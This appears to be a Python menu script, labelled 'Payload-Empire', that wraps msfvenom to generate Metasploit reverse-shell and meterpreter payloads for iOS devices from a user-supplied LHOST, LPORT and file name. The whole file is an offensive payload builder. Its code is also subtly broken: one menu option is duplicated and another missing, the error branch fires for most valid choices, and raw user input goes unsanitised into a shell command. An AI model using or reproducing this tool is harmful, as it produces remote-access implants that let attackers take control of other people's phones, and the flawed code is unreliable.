from colorama import Fore
import os

os.system('clear')

def ios():
    print( 
    f"""{Fore.CYAN}
    Choose a payload:
    {Fore.GREEN}
        1- payload/apple_ios/aarch64/meterpreter_reverse_http
        2- payload/apple_ios/aarch64/meterpreter_reverse_https
        3- payload/apple_ios/aarch64/meterpreter_reverse_tcp
        4- payload/apple_ios/aarch64/shell_reverse_tcp
        5- payload/apple_ios/armle/meterpreter_reverse_http
        6- payload/apple_ios/armle/meterpreter_reverse_https
        7- payload/apple_ios/armle/meterpreter_reverse_tcp

    """)
    
    payload = input(Fore.GREEN + "Payload-Empire:~# ")

    if payload == '1':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/apple_ios/aarch64/meterpreter_reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '2':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/apple_ios/aarch64/meterpreter_reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '3':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/apple_ios/aarch64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '4':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/apple_ios/aarch64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '5':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/apple_ios/armle/meterpreter_reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '6':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/apple_ios/armle/meterpreter_reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '6':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/apple_ios/armle/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    else:
        print(Fore.RED + "[!]ERROR")